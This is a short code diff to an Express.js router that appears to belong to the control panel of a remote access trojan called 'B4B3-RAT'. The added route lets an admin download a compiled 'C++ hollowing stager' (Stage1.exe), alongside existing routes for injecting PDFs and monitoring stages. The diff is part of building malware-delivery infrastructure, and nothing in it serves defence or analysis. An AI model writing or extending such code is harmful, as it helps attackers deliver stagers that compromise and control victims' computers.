@@ -310,6 +310,18 @@ router.post("/api/stage/inject-pdf", requireAdmin, pdfUpload.single("pdf"), (req
   }
 });
 
+// ── Admin: Download compiled Stage1.exe (C++ hollowing stager) ───────────────
+
+router.get("/api/stage/stage1.exe", requireAdmin, (req, res) => {
+  const p = path.join(DL_DIR, "Stage1.exe");
+  if (!fs.existsSync(p)) {
+    return res.status(404).json({ error: "Stage1.exe not found — build B4B3-RAT/Stager/Stage1.cpp first." });
+  }
+  res.setHeader("Content-Type", "application/octet-stream");
+  res.setHeader("Content-Disposition", 'attachment; filename="Stage1.exe"');
+  res.sendFile(p);
+});
+
 // ── Admin: Stage Monitor HTML page ────────────────────────────────────────────
 
 router.get("/stage-monitor", requireAdmin, (_req, res) => {
